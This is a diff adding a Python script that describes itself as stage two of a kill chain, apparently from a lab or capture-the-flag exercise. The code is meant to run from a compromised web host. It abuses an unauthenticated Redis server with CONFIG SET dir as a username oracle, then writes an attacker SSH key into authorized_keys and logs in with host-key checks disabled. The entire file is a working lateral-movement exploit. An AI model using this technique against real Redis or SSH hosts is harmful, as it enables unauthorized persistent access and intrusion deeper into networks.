@@ -1,0 +1,123 @@
+"""
+Stage 2 of the kill chain. Run this FROM INSIDE ec-site's shell (after
+landing RCE via the product-review SSTI), not from the attacker host --
+that's the whole point of the pivot.
+
+Unlike exploit.py, no gopher/SSRF wrapping is needed here: ec-site sits on
+internal-net directly, so we can just speak the Redis protocol over a plain
+socket to proxy-server.internal. Same directory-existence-oracle username
+enumeration and authorized_keys injection technique as exploit.py, just
+without the HTTP hop.
+
+Usage (paste into the ec-site shell):
+    python3 pivot_from_ecsite.py
+"""
+
+import os
+import socket
+import subprocess
+import sys
+
+REDIS_HOST = "proxy-server.internal"
+REDIS_PORT = 6379
+SSH_HOST = "proxy-server.internal"
+SSH_PORT = 22
+KEY_PATH = "/tmp/.pivot_id_ed25519"
+
+USERNAME_CANDIDATES = [
+    "ubuntu", "ec2-user", "centos", "admin", "administrator",
+    "deploy", "deployer", "jenkins", "git", "app", "ops",
+    "proxy", "proxyuser", "bastion",
+]
+
+
+def resp_cmd(*args):
+    out = f"*{len(args)}\r\n"
+    for a in args:
+        out += f"${len(a)}\r\n{a}\r\n"
+    return out
+
+
+def redis_send(payload, timeout=10):
+    s = socket.create_connection((REDIS_HOST, REDIS_PORT), timeout=timeout)
+    s.sendall(payload.encode("latin-1"))
+    s.settimeout(timeout)
+    chunks = []
+    try:
+        while True:
+            data = s.recv(4096)
+            if not data:
+                break
+            chunks.append(data)
+    except socket.timeout:
+        pass
+    s.close()
+    return b"".join(chunks).decode("latin-1")
+
+
+def discover_username():
+    cmds = "".join(
+        resp_cmd("CONFIG", "SET", "dir", f"/home/{name}/.ssh")
+        for name in USERNAME_CANDIDATES
+    )
+    replies = redis_send(cmds).split("\r\n")
+    for name, reply in zip(USERNAME_CANDIDATES, replies):
+        print(f"    /home/{name}/.ssh -> {reply!r}")
+        if reply == "+OK":
+            return name
+    return None
+
+
+def inject_key(username, pubkey):
+    payload = f"\n\n{pubkey}\n\n"
+    cmds = (
+        resp_cmd("CONFIG", "SET", "dir", f"/home/{username}/.ssh")
+        + resp_cmd("CONFIG", "SET", "dbfilename", "authorized_keys")
+        + resp_cmd("SET", "payload", payload)
+        + resp_cmd("SAVE")
+    )
+    print("[*] injecting key into", f"/home/{username}/.ssh/authorized_keys")
+    print("[*] response:", repr(redis_send(cmds)))
+
+
+def generate_keypair():
+    for ext in ("", ".pub"):
+        try:
+            os.remove(KEY_PATH + ext)
+        except FileNotFoundError:
+            pass
+    subprocess.run(
+        ["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY_PATH],
+        check=True,
+        capture_output=True,
+    )
+    with open(KEY_PATH + ".pub") as f:
+        return f.read().strip()
+
+
+if __name__ == "__main__":
+    print("[*] enumerating bastion account via Redis CONFIG SET dir oracle")
+    username = discover_username()
+    if not username:
+        raise SystemExit(
+            "[-] no candidate account had a home directory -- extend USERNAME_CANDIDATES"
+        )
+    print(f"[+] found account: {username}")
+
+    pubkey = generate_keypair()
+    print("[*] generated pivot pubkey:", pubkey)
+    inject_key(username, pubkey)
+
+    print(f"[*] handing off to: ssh -p {SSH_PORT} -i {KEY_PATH} {username}@{SSH_HOST}")
+    os.execvp(
+        "ssh",
+        [
+            "ssh",
+            "-o", "StrictHostKeyChecking=no",
+            "-o", "UserKnownHostsFile=/dev/null",
+            "-tt",
+            "-p", str(SSH_PORT),
+            "-i", KEY_PATH,
+            f"{username}@{SSH_HOST}",
+        ],
+    )
